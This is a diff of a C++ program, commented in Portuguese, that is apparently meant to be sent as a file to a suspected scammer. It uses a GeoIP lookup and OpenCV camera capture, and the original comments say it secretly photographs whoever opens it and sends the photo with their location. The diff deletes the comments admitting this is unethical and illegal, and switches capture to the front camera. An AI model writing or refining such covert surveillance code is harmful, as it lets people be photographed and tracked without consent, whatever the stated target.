@@ -1,9 +1,3 @@
-//Não é ético ou legal enviar um arquivo malicioso para uma pessoa, mesmo que ela seja um suspeito de um crime. 
-//Além disso, é importante lembrar que a invasão de privacidade é um crime, 
-//e você precisa ter cuidado para não violar as leis.
-//Aqui é apenas um exemplo de como fazer um APP com objetivo de ajuda
-//A ideia é quando o golpista receber o arquivo e abrir, ele tera sua foto capiturada e ao mesmo tempo vai ser enviado com a foto sua localização 
-
 #include <iostream>
 #include <fstream>
 #include <GeoIP.h>
@@ -24,8 +18,9 @@ int main() {
     GeoIPRecord_delete(gir);
     GeoIP_delete(gi);
 
-    // Tirando uma foto usando a câmera do dispositivo
-    VideoCapture cap(0); // 0 é o índice da câmera padrão
+    // Tirando uma foto usando a câmera frontal do dispositivo
+    VideoCapture cap(1); // Seleciona a câmera frontal com índice 1
+    cap.set(CAP_PROP_FOURCC, CV_FOURCC('M', 'J', 'P', 'G')); // Define o formato de vídeo para MJPG
     Mat frame;
     cap >> frame; // Captura o frame atual da câmera
     
